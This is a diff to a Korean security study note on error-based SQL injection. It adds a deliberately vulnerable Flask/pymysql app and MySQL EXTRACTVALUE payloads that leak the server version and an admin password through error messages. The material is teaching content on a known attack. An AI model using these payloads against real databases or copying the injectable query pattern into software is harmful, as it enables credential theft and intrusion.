@@ -363,6 +363,72 @@
 <br/>
 
 * Error based SQL Injection 예시: 사용자에게 ```username```을 입력 받아 해당 username을 조회한 후 admin이면 true를, 아니면 false를 반환하는 경우
+    ```python
+    from flask import Flask, request # Flask 프레임워크 사용
+    import pymysql
+
+    app = Flask(__name__)
+
+    def getConnection():
+        return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
+
+    @app.route('/'. methods=['GET'])
+    def index():
+        username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴
+
+        # 이용자가 입력한 username이 별다른 검사 없이 SQL 쿼리에 포함됨 → ⚠️ SQL Injection 취약점이 발생함
+        sql = "SELECT username FROM users WHERE username='%s'" %username
+
+        conn = getConnection()
+        curs = conn.cursor(pymysql.cursors.DictCursor)
+        curs.execute(sql)
+        rows = curs.fetchall()
+        conn.close()
+
+        # SQL 실행 결과를 출력하는 코드가 존재하지 않고 쿼리 실행 결과(True/False)만 판단함
+        if (rows):
+            return "True"
+        else:
+            return "False"
+    
+    app.run(host='0.0.0.0', port=8000, debug=True) # 디버그 모드 활성화(debug=True)
+    ```
+    - Error based SQL Injection 공격 방법
+        + Flask 프레임워크로 개발한 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생했을 때 발생 원인을 출력함
+        + 에러 발생 예시: username에 ```admin 1'```을 입력하면 문법 에러(Syntax Error)가 발생함
+            ```sql
+            # 파이썬 코드 내 index 함수의 두 번째 실행문에서 생성되는 쿼리
+            SELECT username FROM users WHERE username='admin 1''
+            ```
+    - Error based SQL Injection 공격 코드
+        + Background: **```EXTRACTVALUE``` 함수**
+            - 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출하는 함수
+            - 두 번째 인자 값에 따른 함수 실행 결과
+                + 올바른 XPATH 식을 전달한 경우 쿼리가 정상적으로 실행됨
+                    ```sql
+                    SELECT EXTRACTVALUE('<a>test</a><b>abcd</b>', '/a'); # 결과: test
+                    ```
+                + 올바르지 않은 XPATH 식을 전달한 경우 **에러 메시지에 삽입된 식의 결과가 출력됨** <br/> &nbsp;&nbsp; ***→ ⚠️ 올바르지 않은 XPATH 식에 중요한 정보를 추출할 수 있는 식을 입력한다면 공격자는 중요 정보를 획득할 수 있음***
+                    ```sql
+                    SELECT EXTRACTVALUE(1, ":abcd"); # 결과: ERROR 1105 (HY000): XPATH syntax error: ':abcd'
+                    ```
+        + MySQL 환경에서 Error based SQL Injection으로 공격할 때 많이 사용하는 쿼리와 실행 결과
+            ```sql
+            SELECT EXTRACTVALUE(1, CONCAT(0x3a, version()));
+            # 결과: ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
+            ```
+            - XPATH 식에 삽입된 ```version()``` 함수가 실행되면서 에러 메시지에 운영체제에 대한 정보가 포함되어 있음 <br/> &nbsp;&nbsp; → 공격자는 이 정보를 이용해 1-day 또는 0-day 공격을 통해 서버를 장악할 수 있음
+            - ```CONCAT(str1, str2[, str3, ...])``` 함수: 둘 이상의 문자열을 입력한 순서대로 합쳐서 반환해주는 함수
+        + ```EXTRACTVALUE``` 함수와 서브쿼리를 이용하여 데이터베이스의 정보를 추출하는 쿼리와 실행 결과
+            ```sql
+            SELECT EXTRACTVALUE(1, CONCAT(0x3a, (SELECT password FROM users WHERE username='admin')));
+            # 결과; ERROR 1105 (HY000): XPATH syntax error: ':This_is_admin_PASSW@rd'
+            ```
+            - XPATH 식에 삽입된 서브 쿼리가 실행되면서 에러 메시지에 users 테이블의 admin의 비밀번호가 포함되어 있음 <br/> &nbsp;&nbsp; → 공격자는 서브 쿼리를 이용해 임의 테이블의 데이터를 획득할 수 있음
+
+<br/>
+
+* DBMS별로 Error based SQL Injection을 위해 사용하는 주요 쿼리문
 
 <br/><br/><br/>
 
